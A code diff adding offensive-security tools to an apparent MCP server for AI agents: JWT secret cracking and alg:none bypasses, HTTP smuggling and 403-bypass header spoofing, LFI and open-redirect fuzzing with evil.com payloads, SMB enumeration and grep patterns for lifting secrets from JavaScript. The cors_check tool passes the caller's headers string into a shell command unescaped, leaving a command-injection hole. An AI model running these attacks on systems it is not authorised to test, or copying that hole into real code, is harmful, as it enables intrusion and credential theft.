@@ -1073,9 +1073,419 @@ async def cve_stats() -> str:
     return json.dumps(stats_data, indent=2)
 
 
+# ===========================================================================
+# NEW TOOLS — Gap Analysis Implementation
+# ===========================================================================
+
+# ---------------------------------------------------------------------------
+# 44. jwt_attack — JWT token analysis and exploitation (jwt_tool installed)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def jwt_attack(
+    token: str,
+    mode: str = "decode",
+    secret: str = "",
+) -> str:
+    """
+    Analyze, tamper, and attack JWT tokens.
+
+    Args:
+        token: The JWT token string (eyJ...)
+        mode:  decode | crack | alg_confusion | none_alg | tamper
+               - decode:        just decode and show all claims
+               - crack:         brute-force the HMAC secret (needs secret wordlist)
+               - alg_confusion: try RS256→HS256 confusion attack
+               - none_alg:      try 'alg:none' bypass
+               - tamper:        show all attack vectors available
+        secret: Wordlist path for crack mode, or known secret for verify mode
+    """
+    if mode == "decode":
+        cmd = f"jwt_tool {shlex.quote(token)} -d"
+    elif mode == "crack":
+        wl = secret or "/usr/share/wordlists/rockyou.txt"
+        cmd = f"jwt_tool {shlex.quote(token)} -C -d {shlex.quote(wl)}"
+    elif mode == "alg_confusion":
+        cmd = f"jwt_tool {shlex.quote(token)} -X a"
+    elif mode == "none_alg":
+        cmd = f"jwt_tool {shlex.quote(token)} -X n"
+    else:
+        # tamper / show all attacks
+        cmd = f"jwt_tool {shlex.quote(token)} -M at"
+    return fmt_output(await run_shell(cmd, timeout=120), "jwt_attack")
+
+
+# ---------------------------------------------------------------------------
+# 45. cors_check — CORS misconfiguration scanner (corsy installed)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def cors_check(
+    url: str,
+    threads: int = 10,
+    headers: str = "User-Agent: Mozilla/5.0",
+) -> str:
+    """
+    Test for CORS misconfiguration vulnerabilities.
+    Checks for wildcard origins, null origin, trusted subdomain bypass, etc.
+
+    Args:
+        url:     Target URL (e.g. https://api.example.com)
+        threads: Concurrent threads (default 10)
+        headers: Extra request headers (default adds a browser UA)
+    """
+    header_flag = f"--headers '{headers}'" if headers else ""
+    cmd = f"corsy -u {shlex.quote(url)} -t {threads} {header_flag}"
+    return fmt_output(await run_shell(cmd, timeout=120), "cors_check")
+
+
+# ---------------------------------------------------------------------------
+# 46. smuggling_test — HTTP request smuggling (smuggler installed)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def smuggling_test(
+    url: str,
+    timeout: int = 10,
+    log_file: str = "/tmp/smuggler_out.txt",
+) -> str:
+    """
+    Test for HTTP Request Smuggling vulnerabilities (CL.TE, TE.CL, TE.TE).
+    Use on HTTP/1.1 endpoints, load balancers, and reverse proxies.
+
+    Args:
+        url:      Target URL (must be http:// or https://)
+        timeout:  Per-request timeout in seconds (default 10)
+        log_file: File to write findings (default /tmp/smuggler_out.txt)
+    """
+    cmd = (
+        f"python3 /opt/smuggler/smuggler.py "
+        f"-u {shlex.quote(url)} "
+        f"-t {timeout} "
+        f"-l {shlex.quote(log_file)}"
+    )
+    result = await run_shell(cmd, timeout=120)
+    # Also read log file if it has content
+    log_result = await run_shell(f"cat {shlex.quote(log_file)} 2>/dev/null || echo 'No findings logged'")
+    combined = {
+        "stdout": result.get("stdout", ""),
+        "log": log_result.get("stdout", ""),
+        "returncode": result.get("returncode"),
+    }
+    import json as _json
+    return fmt_output({"stdout": _json.dumps(combined), "stderr": "", "returncode": 0}, "smuggling_test")
+
+
+# ---------------------------------------------------------------------------
+# 47. trufflehog_scan — deep secret & credential scanner (trufflehog installed)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def trufflehog_scan(
+    target: str,
+    scan_type: str = "filesystem",
+    only_verified: bool = False,
+) -> str:
+    """
+    Deep secret and credential scanner. Scans git history, filesystems, and repos.
+    Finds API keys, passwords, tokens, private keys even in old commits.
+
+    Args:
+        target:        Path/URL to scan (local dir, git repo URL, or 'git' repo)
+        scan_type:     filesystem | git | github | gitlab (default: filesystem)
+        only_verified: Only report verified/live secrets (default: False)
+    """
+    verified_flag = "--only-verified" if only_verified else ""
+    cmd = (
+        f"trufflehog {shlex.quote(scan_type)} "
+        f"{shlex.quote(target)} "
+        f"--json --no-update {verified_flag}"
+    )
+    return fmt_output(await run_shell(cmd, timeout=300), "trufflehog_scan")
+
+
+# ---------------------------------------------------------------------------
+# 48. header_audit — HTTP security header analysis (pure curl)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def header_audit(url: str) -> str:
+    """
+    Audit HTTP security headers for misconfigurations and missing protections.
+    Checks: HSTS, CSP, X-Frame-Options, X-XSS-Protection, Referrer-Policy,
+    Permissions-Policy, CORS headers, and cookie security flags.
+
+    Args:
+        url: Target URL (e.g. https://example.com)
+    """
+    cmd = f"curl -sSI --max-redirs 5 --connect-timeout 10 {shlex.quote(url)}"
+    result = await run_shell(cmd, timeout=30)
+    headers_raw = result.get("stdout", "")
+
+    # Parse and grade each security header
+    checks = {
+        "Strict-Transport-Security": ("HSTS", "Missing — site can be downgraded to HTTP"),
+        "Content-Security-Policy": ("CSP", "Missing — XSS risk if not set"),
+        "X-Frame-Options": ("Clickjacking", "Missing — site can be embedded in iframes"),
+        "X-Content-Type-Options": ("MIME Sniff", "Missing — MIME type confusion attacks possible"),
+        "Referrer-Policy": ("Referrer Leak", "Missing — referrer headers leak to third parties"),
+        "Permissions-Policy": ("Feature Policy", "Missing — browser features unrestricted"),
+    }
+
+    findings = {}
+    headers_lower = headers_raw.lower()
+    for header, (label, missing_msg) in checks.items():
+        if header.lower() in headers_lower:
+            findings[label] = "✅ Present"
+        else:
+            findings[label] = f"❌ {missing_msg}"
+
+    # CORS check
+    if "access-control-allow-origin: *" in headers_lower:
+        findings["CORS"] = "⚠️  Wildcard (*) — accepts requests from any origin"
+    elif "access-control-allow-origin" in headers_lower:
+        findings["CORS"] = "✅ Restricted origin"
+    else:
+        findings["CORS"] = "ℹ️  No CORS headers (not necessarily bad)"
+
+    import json as _json
+    output = _json.dumps({"url": url, "security_headers": findings, "raw_headers": headers_raw}, indent=2)
+    return fmt_output({"stdout": output, "stderr": "", "returncode": 0}, "header_audit")
+
+
+# ---------------------------------------------------------------------------
+# 49. whois_lookup — WHOIS domain / IP registration info
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def whois_lookup(target: str) -> str:
+    """
+    WHOIS lookup for a domain or IP address.
+    Returns registrant info, nameservers, registration dates, and org details.
+    Useful for scope validation and finding related domains/orgs.
+
+    Args:
+        target: Domain (e.g. example.com) or IP address (e.g. 1.2.3.4)
+    """
+    cmd = f"whois {shlex.quote(target)}"
+    return fmt_output(await run_shell(cmd, timeout=30), "whois_lookup")
+
+
+# ---------------------------------------------------------------------------
+# 50. crt_sh_enum — Certificate Transparency subdomain discovery
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def crt_sh_enum(domain: str) -> str:
+    """
+    Search Certificate Transparency logs (crt.sh) for subdomains.
+    Completely passive and free — no API key needed.
+    Often finds subdomains that subfinder and amass miss.
+    Always run this alongside subfinder_enum.
+
+    Args:
+        domain: Target domain (e.g. example.com)
+    """
+    cmd = f"curl -s 'https://crt.sh/?q=%25.{shlex.quote(domain)}&output=json'"
+    return fmt_output(await run_shell(cmd, timeout=30), "crt_sh_enum")
+
+
+# ---------------------------------------------------------------------------
+# 51. lfi_scan — Local File Inclusion fuzzer (ffuf + SecLists)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def lfi_scan(
+    url: str,
+    param: str = "FUZZ",
+    threads: int = 40,
+) -> str:
+    """
+    Fuzz for Local File Inclusion (LFI) and Path Traversal vulnerabilities.
+    Use on any URL parameter that reads files (page=, file=, path=, template=).
+
+    Example:
+        url = "http://example.com/index.php?page=FUZZ"
+
+    Args:
+        url:    URL with FUZZ keyword where the LFI payload goes
+        param:  Fuzzing keyword in the URL (default: FUZZ)
+        threads: Concurrent threads (default: 40)
+    """
+    wordlist = "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
+    cmd = (
+        f"ffuf -u {shlex.quote(url)} "
+        f"-w {shlex.quote(wordlist)}:{shlex.quote(param)} "
+        f"-fc 404,400 -t {threads} -json -s"
+    )
+    return fmt_output(await run_shell(cmd, timeout=300), "lfi_scan")
+
+
+# ---------------------------------------------------------------------------
+# 52. smb_enum — Windows/Samba SMB enumeration (enum4linux)
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def smb_enum(
+    target: str,
+    username: str = "",
+    password: str = "",
+) -> str:
+    """
+    Enumerate Windows/Samba SMB shares, users, groups, and password policies.
+    Use when nmap shows port 445 or 139 open.
+
+    Args:
+        target:   Target IP address
+        username: SMB username for authenticated enumeration (optional)
+        password: SMB password for authenticated enumeration (optional)
+    """
+    auth_flag = f"-u {shlex.quote(username)} -p {shlex.quote(password)}" if username else ""
+    cmd = f"enum4linux -a {auth_flag} {shlex.quote(target)}"
+    return fmt_output(await run_shell(cmd, timeout=180), "smb_enum")
+
+
+# ---------------------------------------------------------------------------
+# 53. ssh_audit_tool — SSH server algorithm and config audit
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def ssh_audit_tool(host: str, port: int = 22) -> str:
+    """
+    Audit SSH server for weak algorithms, deprecated ciphers, and misconfigurations.
+    Use when nmap shows port 22 open. Identifies CVE-linked weaknesses.
+
+    Args:
+        host: Target hostname or IP
+        port: SSH port (default 22)
+    """
+    cmd = f"ssh-audit -j {shlex.quote(host)}:{port}"
+    return fmt_output(await run_shell(cmd, timeout=60), "ssh_audit_tool")
+
+
+# ---------------------------------------------------------------------------
+# 54. open_redirect_check — Open redirect vulnerability scanner
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def open_redirect_check(
+    url: str,
+    param: str = "FUZZ",
+    threads: int = 30,
+) -> str:
+    """
+    Test for open redirect vulnerabilities by fuzzing URL/redirect parameters.
+    Use on login pages, OAuth flows, and any URL with redirect/return/next params.
+
+    Example:
+        url = "https://example.com/login?next=FUZZ"
+
+    Args:
+        url:     URL with FUZZ where redirect payload goes
+        param:   Fuzzing keyword (default: FUZZ)
+        threads: Concurrent threads (default: 30)
+    """
+    wordlist = "/usr/share/seclists/Fuzzing/redirect_urls.txt"
+    # Fallback: create a minimal redirect payload list if seclists doesn't have it
+    fallback_payloads = (
+        "https://evil.com\n"
+        "//evil.com\n"
+        "/\\evil.com\n"
+        "https:evil.com\n"
+        "/%09/evil.com\n"
+    )
+    setup_cmd = (
+        f"[ -f {shlex.quote(wordlist)} ] || "
+        f"echo {shlex.quote(fallback_payloads)} > /tmp/redirect_payloads.txt"
+    )
+    await run_shell(setup_cmd)
+    wl = wordlist if (await run_shell(f"test -f {shlex.quote(wordlist)} && echo yes")).get("stdout", "").strip() == "yes" else "/tmp/redirect_payloads.txt"
+    cmd = (
+        f"ffuf -u {shlex.quote(url)} "
+        f"-w {shlex.quote(wl)}:{shlex.quote(param)} "
+        f"-mr 'Location:' -fc 404 -t {threads} -json -s"
+    )
+    return fmt_output(await run_shell(cmd, timeout=180), "open_redirect_check")
+
+
+# ---------------------------------------------------------------------------
+# 55. bypass_403 — 403 Forbidden bypass via header manipulation
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def bypass_403(url: str) -> str:
+    """
+    Attempt to bypass 403 Forbidden responses using common header tricks.
+    Tries: X-Forwarded-For, X-Real-IP, X-Custom-IP-Authorization, path manipulation,
+    method overrides, and URL encoding variants.
+
+    Args:
+        url: The URL returning 403 (e.g. https://example.com/admin)
+    """
+    import json as _json
+
+    bypass_attempts = [
+        ("Original", url, ""),
+        ("X-Forwarded-For: 127.0.0.1", url, "-H 'X-Forwarded-For: 127.0.0.1'"),
+        ("X-Forwarded-For: localhost", url, "-H 'X-Forwarded-For: localhost'"),
+        ("X-Real-IP: 127.0.0.1", url, "-H 'X-Real-IP: 127.0.0.1'"),
+        ("X-Custom-IP-Authorization: 127.0.0.1", url, "-H 'X-Custom-IP-Authorization: 127.0.0.1'"),
+        ("X-Originating-IP: 127.0.0.1", url, "-H 'X-Originating-IP: 127.0.0.1'"),
+        ("Referer: https://google.com", url, "-H 'Referer: https://google.com'"),
+        ("URL with trailing slash", url.rstrip("/") + "/", ""),
+        ("URL with /./", url.rstrip("/") + "/./", ""),
+        ("URL with ..;/ suffix", url.rstrip("/") + "/..;/", ""),
+    ]
+
+    results = []
+    for label, target_url, extra_flag in bypass_attempts:
+        cmd = f"curl -sk -o /dev/null -w '%{{http_code}}' {extra_flag} {shlex.quote(target_url)}"
+        r = await run_shell(cmd, timeout=10)
+        status = r.get("stdout", "???").strip()
+        results.append({"attempt": label, "status_code": status, "bypassed": status == "200"})
+
+    output = _json.dumps({"target": url, "bypass_attempts": results}, indent=2)
+    return fmt_output({"stdout": output, "stderr": "", "returncode": 0}, "bypass_403")
+
+
+# ---------------------------------------------------------------------------
+# 56. js_extract — extract endpoints and secrets from JavaScript files
+# ---------------------------------------------------------------------------
+@mcp.tool()
+async def js_extract(url_or_file: str) -> str:
+    """
+    Extract endpoints, API paths, and potential secrets from JavaScript files.
+    Use after katana_crawl finds .js files — pass each JS file URL here.
+
+    Args:
+        url_or_file: URL to a JS file (https://example.com/app.js)
+                     or local path (/tmp/app.js)
+    """
+    import json as _json
+
+    # Download JS if it's a URL
+    if url_or_file.startswith("http"):
+        dl_cmd = f"curl -sk {shlex.quote(url_or_file)} -o /tmp/js_extract_target.js"
+        await run_shell(dl_cmd, timeout=30)
+        js_file = "/tmp/js_extract_target.js"
+    else:
+        js_file = url_or_file
+
+    # Extract URL-like patterns
+    endpoints_cmd = (
+        f"grep -oE '(\"|\\')/[a-zA-Z0-9_/.-]{{2,}}(\"|\\')|"
+        f"(api|endpoint|url|path|route)[\"\\s]*[:=][\"\\s]*[\"\\'][^\"\\']{{5,}}[\"\\']' "
+        f"{shlex.quote(js_file)} | sort -u | head -100"
+    )
+    endpoints_result = await run_shell(endpoints_cmd, timeout=15)
+
+    # Extract potential secrets (API keys, tokens)
+    secrets_cmd = (
+        f"grep -oiE '(api[_-]?key|token|secret|password|auth|bearer|aws)[\"\\s]*[:=][\"\\s]*[\"\\'][A-Za-z0-9_/+=-]{{10,}}[\"\\']' "
+        f"{shlex.quote(js_file)} | sort -u | head -50"
+    )
+    secrets_result = await run_shell(secrets_cmd, timeout=15)
+
+    output = _json.dumps({
+        "source": url_or_file,
+        "endpoints_found": endpoints_result.get("stdout", "").splitlines(),
+        "potential_secrets": secrets_result.get("stdout", "").splitlines(),
+    }, indent=2)
+    return fmt_output({"stdout": output, "stderr": "", "returncode": 0}, "js_extract")
+
+
 # ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
 if __name__ == "__main__":
     mcp.run(transport="stdio")
+
 
